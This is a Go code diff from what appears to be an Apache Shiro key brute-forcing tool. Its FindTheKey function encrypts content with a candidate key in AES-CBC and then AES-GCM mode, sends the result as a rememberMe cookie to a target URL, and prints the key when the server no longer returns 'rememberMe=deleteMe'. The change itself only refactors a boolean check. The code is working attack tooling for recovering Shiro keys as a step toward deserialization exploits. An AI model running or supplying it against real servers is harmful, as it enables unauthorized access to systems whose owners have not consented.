@@ -17,21 +17,21 @@ func FindTheKey(ShiroKey string, Content []byte, TargetUrl string) (bool, string
 	if err != nil {
 		return false, result
 	}
-	ok, _ := HttpRequest(RememberMe, TargetUrl)
-	if ok {
+	rember, _ := HttpRequest(RememberMe, TargetUrl)
+	if !rember {
 		result = "[+] CBC-KEY:" + ShiroKey + "\n[+] rememberMe=" + RememberMe
 	} else {
 		RememberMe, err = AesGcmEncrypt(key, Content)
 		if err != nil {
 			return false, result
 		}
-		ok, _ = HttpRequest(RememberMe, TargetUrl)
-		if ok {
+		rember, _ = HttpRequest(RememberMe, TargetUrl)
+		if !rember {
 			result = "[+] GCM-KEY:" + ShiroKey + "\n[+] rememberMe=" + RememberMe
 		}
 	}
 
-	return ok, result
+	return !rember, result
 }
 
 func HttpRequest(RememberMe string, TargetUrl string) (bool, error) {
@@ -73,5 +73,5 @@ func HttpRequest(RememberMe string, TargetUrl string) (bool, error) {
 	for i := range resp.Header["Set-Cookie"] {
 		SetCookieAll += resp.Header["Set-Cookie"][i]
 	}
-	return !strings.Contains(SetCookieAll, NRemeberMe+"=deleteMe;"), nil
+	return strings.Contains(SetCookieAll, NRemeberMe+"=deleteMe;"), nil
 }
